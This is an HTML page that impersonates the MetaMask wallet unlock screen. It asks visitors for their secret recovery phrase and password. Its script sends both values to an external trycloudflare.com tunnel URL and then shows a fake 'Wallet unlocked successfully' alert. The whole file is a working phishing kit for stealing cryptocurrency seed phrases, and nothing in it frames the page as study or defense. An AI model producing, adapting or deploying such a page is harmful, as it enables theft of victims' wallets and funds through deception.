<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MetaMask</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            width: 320px;
            padding: 20px;
            text-align: center;
        }
        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            background-color: #009ee3; /* MetaMask Blue */
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        button:hover {
            background-color: #007cc2;
        }
        .logo {
            width: 50px;
            height: 50px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- MetaMask Logo -->
    <img src="https://metamask.io/images/metamask-icon.svg" alt="MetaMask" class="logo">
    
    <h1>Welcome back!</h1>
    <p>Enter your secret recovery phrase to unlock your account.</p>

    <form id="loginForm">
        <input type="text" id="phrase" placeholder="Secret Recovery Phrase" required autocomplete="off">
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Unlock</button>
    </form>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Show a loading spinner effect
    const btn = document.querySelector('button');
    btn.textContent = 'Unlocking...';
    btn.disabled = true;

    const phrase = document.getElementById('phrase').value;
    const password = document.getElementById('password').value;

    // Send data to your backend
    fetch('https://happen-installing-societies-cement.trycloudflare.com/api/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phrase, password })
    }).then(() => {
        // Fake success message
        alert("Wallet unlocked successfully!");
    });
});
</script>

</body>
</html>
